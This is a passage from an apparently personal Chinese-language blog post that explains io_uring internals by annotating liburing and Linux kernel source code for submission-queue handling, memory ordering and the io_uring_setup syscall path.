class="title">ring</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_sq</span> *<span class="title">sq</span> =</span> &amp;ring-&gt;sq;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> head, next = sq-&gt;sqe_tail + <span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> shift = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ring-&gt;flags &amp; IORING_SETUP_SQE128)</span><br><span class="line">shift = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (!(ring-&gt;flags &amp; IORING_SETUP_SQPOLL))</span><br><span class="line">head = IO_URING_READ_ONCE(*sq-&gt;khead);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">head = io_uring_smp_load_acquire(sq-&gt;khead);</span><br><span class="line"><span class="comment">// 通过原子读获取head</span></span><br><span class="line"><span class="comment">// sq-&gt;khead = sq-&gt;ring_ptr + p-&gt;sq_off.head;</span></span><br><span class="line"><span class="comment">// 这里实际上读的是共享内存的一个指针内存的 uint 值</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (next - head &lt;= sq-&gt;ring_entries) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_sqe</span> *<span class="title">sqe</span>;</span></span><br><span class="line"></span><br><span class="line">sqe = &amp;sq-&gt;sqes[(sq-&gt;sqe_tail &amp; sq-&gt;ring_mask) &lt;&lt; shift];</span><br><span class="line"><span class="comment">// sq-&gt;ring_mask 来自kernel 设置的params </span></span><br><span class="line"><span class="comment">// rings-&gt;sq_ring_mask = p-&gt;sq_entries - 1;</span></span><br><span class="line"><span class="comment">// 由于sq_entries 为2的幂次倍</span></span><br><span class="line"><span class="comment">// 这里实际上就是一个循环队列的访问，</span></span><br><span class="line">sq-&gt;sqe_tail = next;</span><br><span class="line"><span class="keyword">return</span> sqe;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="io-uring-prep-xxx"><code>io_uring_prep_xxx</code></h3><p>这是一个系列函数, 用来实现 <code>io_uring</code>  提供的各种 io操作, 其根本实现是 设置 一个 <code>sqe</code> 结构体(这个结构体是内核的API),</p><p>这里以 <code>io_uring_prep_openat</code> 为例</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">IOURINGINLINE <span class="type">void</span> <span class="title function_">io_uring_prep_openat</span><span class="params">(<span class="keyword">struct</span> io_uring_sqe *sqe, <span class="type">int</span> dfd,</span></span><br><span class="line"><span class="params"><span class="type">const</span> <span class="type">char</span> *path, <span class="type">int</span> flags,</span></span><br><span class="line"><span class="params"><span class="type">mode_t</span> mode)</span></span><br><span class="line">&#123;</span><br><span class="line">io_uring_prep_rw(IORING_OP_OPENAT, sqe, dfd, path, mode, <span class="number">0</span>);</span><br><span class="line">sqe-&gt;open_flags = (__u32) flags;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">IOURINGINLINE <span class="type">void</span> <span class="title function_">io_uring_prep_rw</span><span class="params">(<span class="type">int</span> op, <span class="keyword">struct</span> io_uring_sqe *sqe, <span class="type">int</span> fd,</span></span><br><span class="line"><span class="params">    <span class="type">const</span> <span class="type">void</span> *addr, <span class="type">unsigned</span> len,</span></span><br><span class="line"><span class="params">    __u64 offset)</span></span><br><span class="line">&#123;</span><br><span class="line">sqe-&gt;opcode = (__u8) op;</span><br><span class="line"><span class="comment">// 设置op为 open</span></span><br><span class="line">sqe-&gt;flags = <span class="number">0</span></span><br><span class="line">sqe-&gt;ioprio = <span class="number">0</span>;</span><br><span class="line">sqe-&gt;fd = fd;</span><br><span class="line"><span class="comment">// 提供表示dir 的 -100 fd</span></span><br><span class="line">sqe-&gt;off = offset;</span><br><span class="line"><span class="comment">// 0</span></span><br><span class="line">sqe-&gt;addr = (<span class="type">unsigned</span> <span class="type">long</span>) addr;</span><br><span class="line"><span class="comment">// 提供文件地址</span></span><br><span class="line">sqe-&gt;len = len;</span><br><span class="line">sqe-&gt;rw_flags = <span class="number">0</span>;</span><br><span class="line">sqe-&gt;buf_index = <span class="number">0</span>;</span><br><span class="line">sqe-&gt;personality = <span class="number">0</span>;</span><br><span class="line">sqe-&gt;file_index = <span class="number">0</span>;</span><br><span class="line">sqe-&gt;addr3 = <span class="number">0</span>;</span><br><span class="line">sqe-&gt;__pad2[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>归根结底就是设置了一个sqe</p><p>这里笔者有一个问题：<br>#TODO<br>在<code>IORING_SETUP_SQROLL</code>时, io_uring用户和内核采用共享内存通信，内核态是如何知道一个sqe的全部参数已经设置完毕了，有没有可能用户态正在设置sqe的部分成员时，内核已经在处理这个sqe了？</p><p>在之后  [[#<code>__io_uring_flush_sq</code>]] 笔者似乎找到了这个问题的答案：</p><ul><li>通过 <code>memory_store_release</code> 保证sqe的更新不会被重排到 ktail 的修改前</li><li>通过 修改 ktail 表示真正提交了一个任务</li></ul><h3 id="io-uring-submit"><code>io_uring_submit</code></h3><p><code>io_uring_submit</code> 用于提交一个任务</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">io_uring_submit</span><span class="params">(<span class="keyword">struct</span> io_uring *ring)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> __io_uring_submit_and_wait(ring, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> __io_uring_submit_and_wait(<span class="keyword">struct</span> io_uring *ring, <span class="type">unsigned</span> wait_nr)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> __io_uring_submit(ring, __io_uring_flush_sq(ring), wait_nr, <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最终到达 <code>__io_uring_submit</code>.  不过这个函数, 在SQPOLL模式下用处不大, 真正的提交操作应该说是在 <code>__io_uring_flush_sq</code> 中实现的.</p><p>这里主要是判断当前情况需不需要调用 <code>io_uring_enter</code> syscall.</p><p>如果当前 是IOPOLL模式, 就需要 <code>io_uring_enter</code> 来收割任务.</p><p>如果是 SQPOLL 模式， 且 内核处理线程已 <code>idle</code> ，那么就通过  <code>io_uring_enter</code> syscall 来唤醒</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> __io_uring_submit(<span class="keyword">struct</span> io_uring *ring, <span class="type">unsigned</span> submitted,</span><br><span class="line">     <span class="type">unsigned</span> wait_nr, <span class="type">bool</span> getevents)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">bool</span> cq_needs_enter = getevents || wait_nr || cq_ring_needs_enter(ring);</span><br><span class="line"><span class="type">unsigned</span> flags;</span><br><span class="line"><span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">flags = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (sq_ring_needs_enter(ring, submitted, &amp;flags) || cq_needs_enter) &#123;</span><br><span class="line"><span class="keyword">if</span> (cq_needs_enter)</span><br><span class="line">flags |= IORING_ENTER_GETEVENTS;</span><br><span class="line"><span class="keyword">if</span> (ring-&gt;int_flags &amp; INT_FLAG_REG_RING)</span><br><span class="line">flags |= IORING_ENTER_REGISTERED_RING;</span><br><span class="line"></span><br><span class="line">ret = __sys_io_uring_enter(ring-&gt;enter_ring_fd, submitted,</span><br><span class="line">   wait_nr, flags, <span class="literal">NULL</span>);</span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line">ret = submitted;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="io-uring-flush-sq"><code>__io_uring_flush_sq</code></h4><p>主要用来更新内核sq 的tail指针， 最终返回需要提交的任务数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">unsigned</span> __io_uring_flush_sq(<span class="keyword">struct</span> io_uring *ring)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_sq</span> *<span class="title">sq</span> =</span> &amp;ring-&gt;sq;</span><br><span class="line"><span class="type">unsigned</span> tail = sq-&gt;sqe_tail;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (sq-&gt;sqe_head != tail) &#123;</span><br><span class="line">sq-&gt;sqe_head = tail;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Ensure kernel sees the SQE updates before the tail update.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (!(ring-&gt;flags &amp; IORING_SETUP_SQPOLL))</span><br><span class="line">IO_URING_WRITE_ONCE(*sq-&gt;ktail, tail);</span><br><span class="line"><span class="comment">// 原子读</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">io_uring_smp_store_release(sq-&gt;ktail, tail);</span><br><span class="line"><span class="comment">// memory_release 的内存序来写</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"> */</span><br><span class="line"><span class="keyword">return</span> tail - *sq-&gt;khead;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 SQPOLL 模式下,内核提交者可能同时在更新头指针。<br>对于非 SQPOLL 模式,应用自己更新头指针,不存在并发问题。<br>即使 SQPOLL 模式下,就算头指针读取是原子的,获取到的值也可能立即过期,存在并发修改的问题。<br>最坏情况下,读取的值会高估实际可提交的请求数。</p><p>在这里用到了一个原子写 <code>IO_URING_WRITE_ONCE</code> .</p><p>而 <code>io_uring_smb_store_release</code> 笔者涉及到内存序的问题，内存序是为了防止指令重排产生的，笔者还没有特别理解。</p><p>笔者尝试解释一下， 这里使用使用<code>memory_order_release</code>内存序标注这个存储操作</p><p>release内存序的特点是:</p><ol><li>当前线程本地的修改对其他线程可见</li><li>防止存储操作被重新排序</li></ol><p>这里应该是让此处对于sqe的修改，要在对于tail指针的修改前完成，防止指令重排的影响</p><p>如果是对于IOPOLL，内核的真正确认提交是在 <code>io_uring_enter</code> 实现的，其实是和当前处于同一个线程，因此不需要通过  <code>memory_order_release</code> 来保证 “当前线程本地的修改对其他线程可见”， 对同一线程的数据冒险应该是由旁路机制处理的</p><p>#TODO</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> io_uring_smp_store_release(p, v)\</span></span><br><span class="line"><span class="meta">atomic_store_explicit((_Atomic __typeof__(*(p)) *)(p), (v), \</span></span><br><span class="line"><span class="meta">      memory_order_release)</span></span><br></pre></td></tr></table></figure><h2 id="syscall">syscall</h2><p>syscall是内核提供给用户态的接口，io_uring涉及三个syscall</p><ul><li><a href="https://man7.org/linux/man-pages/man2/io_uring_setup.2.html">io_uring_setup(2)</a></li><li><a href="https://man7.org/linux/man-pages/man2/io_uring_enter.2.html">io_uring_enter(2)</a></li><li><a href="https://man7.org/linux/man-pages/man2/io_uring_register.2.html">io_uring_register(2)</a></li></ul><p>笔者这里主要讲述前两个syscall</p><h3 id="io-uring-setup"><code>io_uring_setup</code></h3><p>参数</p><ul><li>entries:  sq队列大小</li><li>params：提供的各种参数，许多返回值也会写入此结构体积</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">io_uring_setup</span><span class="params">(u32 entries, <span class="keyword">struct</span> io_uring_params __user *params)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_params</span> <span class="title">p</span>;</span></span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (copy_from_user(&amp;p, params, <span class="keyword">sizeof</span>(p)))</span><br><span class="line"><span class="keyword">return</span> -EFAULT;</span><br><span class="line"><span class="comment">// 将params复制到内核空间</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ARRAY_SIZE(p.resv); i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (p.resv[i])</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (p.flags &amp; ~(IORING_SETUP_IOPOLL | IORING_SETUP_SQPOLL |</span><br><span class="line">IORING_SETUP_SQ_AFF | IORING_SETUP_CQSIZE |</span><br><span class="line">IORING_SETUP_CLAMP | IORING_SETUP_ATTACH_WQ |</span><br><span class="line">IORING_SETUP_R_DISABLED | IORING_SETUP_SUBMIT_ALL |</span><br><span class="line">IORING_SETUP_COOP_TASKRUN | IORING_SETUP_TASKRUN_FLAG |</span><br><span class="line">IORING_SETUP_SQE128 | IORING_SETUP_CQE32 |</span><br><span class="line">IORING_SETUP_SINGLE_ISSUER | IORING_SETUP_DEFER_TASKRUN |</span><br><span class="line">IORING_SETUP_NO_MMAP | IORING_SETUP_REGISTERED_FD_ONLY |</span><br><span class="line">IORING_SETUP_NO_SQARRAY))</span><br><span class="line"><span class="keyword">return</span> -EINVAL; </span><br><span class="line"><span class="comment">// 如果有非法flag，直接返回</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> io_uring_create(entries, &amp;p, params);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来是首先检查entries 和flags。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __cold <span class="type">int</span> <span class="title function_">io_uring_create</span><span class="params">(<span class="type">unsigned</span> entries, <span class="keyword">struct</span> io_uring_params *p,</span></span><br><span class="line"><span class="params">  <span class="keyword">struct</span> io_uring_params __user *params)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_ring_ctx</span> *<span class="title">ctx</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_task</span> *<span class="title">tctx</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line"><span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!entries)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (entries &gt; IORING_MAX_ENTRIES) &#123;</span><br><span class="line"><span class="keyword">if</span> (!(p-&gt;flags &amp; IORING_SETUP_CLAMP))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">entries = IORING_MAX_ENTRIES;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((p-&gt;flags &amp; IORING_SETUP_REGISTERED_FD_ONLY)</span><br><span class="line">    &amp;&amp; !(p-&gt;flags &amp; IORING_SETUP_NO_MMAP))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br></pre></td></tr></table></figure><p>设置sq_entries 以2的幂次向上取整， 这是为了方便环形队列的处理.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">p-&gt;sq_entries = roundup_pow_of_two(entries);</span><br><span class="line"><span class="keyword">if</span> (p-&gt;flags &amp; IORING_SETUP_CQSIZE) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If IORING_SETUP_CQSIZE is set, we do the same roundup</span></span><br><span class="line"><span class="comment"> * to a power-of-two, if it isn&#x27;t already. We do NOT impose</span></span><br><span class="line"><span class="comment"> * any cq vs sq ring sizing.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (!p-&gt;cq_entries)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (p-&gt;cq_entries &gt; IORING_MAX_CQ_ENTRIES) &#123;</span><br><span class="line"><span class="keyword">if</span> (!(p-&gt;flags &amp; IORING_SETUP_CLAMP))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">p-&gt;cq_entries = IORING_MAX_CQ_ENTRIES;</span><br><span class="line">&#125;</span><br><span class="line">p-&gt;cq_entries = roundup_pow_of_two(p-&gt;cq_entries);</span><br><span class="line"><span class="keyword">if</span> (p-&gt;cq_entries &lt; p-&gt;sq_entries)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">p-&gt;cq_entries = <span class="number">2</span> * p-&gt;sq_entries;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来是一系列设置ctx的代码，笔者暂且不在这里分析，之后遇见了再分析每一项</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">ctx = io_ring_ctx_alloc(p);</span><br><span class="line"><span class="keyword">if</span> (!ctx)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((ctx-&gt;flags &amp; IORING_SETUP_DEFER_TASKRUN) &amp;&amp;</span><br><span class="line">    !(ctx-&gt;flags &amp; IORING_SETUP_IOPOLL) &amp;&amp;</span><br><span class="line">    !(ctx-&gt;flags &amp; IORING_SETUP_SQPOLL))</span><br><span class="line">ctx-&gt;task_complete = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ctx-&gt;task_complete || (ctx-&gt;flags &amp; IORING_SETUP_IOPOLL))</span><br><span class="line">ctx-&gt;lockless_cq = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * lazy poll_wq activation relies on -&gt;task_complete for synchronisation</span></span><br><span class="line"><span class="comment"> * purposes, see io_activate_pollwq()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (!ctx-&gt;task_complete)</span><br><span class="line">ctx-&gt;poll_activated = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * When SETUP_IOPOLL and SETUP_SQPOLL are both enabled, user</span></span><br><span class="line"><span class="comment"> * space applications don&#x27;t need to do io completion events</span></span><br><span class="line"><span class="comment"> * polling again, they can rely on io_sq_thread to do polling</span></span><br><span class="line"><span class="comment"> * work, which can reduce cpu usage and uring_lock contention.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (ctx-&gt;flags &amp; IORING_SETUP_IOPOLL &amp;&amp;</span><br><span class="line">    !(ctx-&gt;flags &amp; IORING_SETUP_SQPOLL))</span><br><span class="line">ctx-&gt;syscall_iopoll = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">ctx-&gt;compat = in_compat_syscall();</span><br><span class="line"><span class="keyword">if</span> (!ns_capable_noaudit(&amp;init_user_ns, CAP_IPC_LOCK))</span><br><span class="line">ctx-&gt;user = get_uid(current_user());</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * For SQPOLL, we just need a wakeup, always. For !SQPOLL, if</span></span><br><span class="line"><span class="comment"> * COOP_TASKRUN is set, then IPIs are never needed by the app.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">ret = -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (ctx-&gt;flags &amp; IORING_SETUP_SQPOLL) &#123;</span><br><span class="line"><span class="comment">/* IPI related flags don&#x27;t make sense with SQPOLL */</span></span><br><span class="line"><span class="keyword">if</span> (ctx-&gt;flags &amp; (IORING_SETUP_COOP_TASKRUN |</span><br><span class="line">  IORING_SETUP_TASKRUN_FLAG |</span><br><span class="line">  IORING_SETUP_DEFER_TASKRUN))</span><br><span class="line"><span class="keyword">goto</span> err;</span><br><span class="line">ctx-&gt;notify_method = TWA_SIGNAL_NO_IPI;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (ctx-&gt;flags &amp; IORING_SETUP_COOP_TASKRUN) &#123;</span><br><span class="line">ctx-&gt;notify_method = TWA_SIGNAL_NO_IPI;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (ctx-&gt;flags &amp; IORING_SETUP_TASKRUN_FLAG &amp;&amp;</span><br><span class="line">    !(ctx-&gt;flags &amp; IORING_SETUP_DEFER_TASKRUN))</span><br><span class="line"><span class="keyword">goto</span> err;</span><br><span class="line">ctx-&gt;notify_method = TWA_SIGNAL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * For DEFER_TASKRUN we require the completion task to be the same as the</span></span><br><span class="line"><span class="comment"> * submission task. This implies that there is only one submitter, so enforce</span></span><br><span class="line"><span class="comment"> * that.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (ctx-&gt;flags &amp; IORING_SETUP_DEFER_TASKRUN &amp;&amp;</span><br><span class="line">    !(ctx-&gt;flags &amp; IORING_SETUP_SINGLE_ISSUER)) &#123;</span><br><span class="line"><span class="keyword">goto</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This is just grabbed for accounting purposes. When a process exits,</span></span><br><span class="line"><span class="comment"> * the mm is exited and dropped before the files, hence we need to hang</span></span><br><span class="line"><span class="comment"> * on to this mm purely for the purposes of being able to unaccount</span></span><br><span class="line"><span class="comment"> * memory (locked/pinned vm). It&#x27;s not used for anything else.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">mmgrab(current-&gt;mm);</span><br><span class="line">ctx-&gt;mm_account = current-&gt;mm;</span><br></pre></td></tr></table></figure><p>[[#<code>io_allocate_scq_urings</code> ]]  分配了scq和rings的内存</p><p>[[#<code>io_sq_offload_create</code>]]      创建了任务处理线程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ret = io_allocate_scq_urings(ctx, p);</span><br><span class="line"><span class="keyword">if</span> (ret)</span><br><span class="line"><span class="keyword">goto</span> err;</span><br><span class="line"></span><br><span class="line">ret = io_sq_offload_create(ctx, p);</span><br><span class="line"><span class="keyword">if</span> (ret)</span><br><span class="line"><span class="keyword">goto</span> err;</span><br><span class="line"></span><br><span class="line">ret = io_rsrc_init(ctx);</span><br><span class="line"><span class="keyword">if</span> (ret)</span><br><span class="line"><span class="keyword">goto</span> err;</span><br></pre></td></tr></table></figure><p>设置sq_off，即通过 <code>params</code> 返回给用户的 <code>ring</code> 中各个成员的偏移</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">p-&gt;sq_off.head = offsetof(<span class="keyword">struct</span> io_rings, sq.head);</span><br><span class="line">p-&gt;sq_off.tail = offsetof(<span class="keyword">struct</span> io_rings, sq.tail);</span><br><span class="line">p-&gt;sq_off.ring_mask = offsetof(<span class="keyword">struct</span> io_rings, sq_ring_mask);</span><br><span class="line">p-&gt;sq_off.ring_entries = offsetof(<span class="keyword">struct</span> io_rings, sq_ring_entries);</span><br><span class="line">p-&gt;sq_off.flags = offsetof(<span class="keyword">struct</span> io_rings, sq_flags);</span><br><span class="line">p-&gt;sq_off.dropped = offsetof(<span class="keyword">struct</span> io_rings, sq_dropped);</span><br><span class="line"><span class="keyword">if</span> (!(ctx-&gt;flags &amp; IORING_SETUP_NO_SQARRAY))</span><br><span class="line">p-&gt;sq_off.<span class="built_in">array</span> = (<span class="type">char</span> *)ctx-&gt;sq_array - (<span class="type">char</span> *)ctx-&gt;rings;</span><br><span class="line">p-&gt;sq_off.resv1 = <span 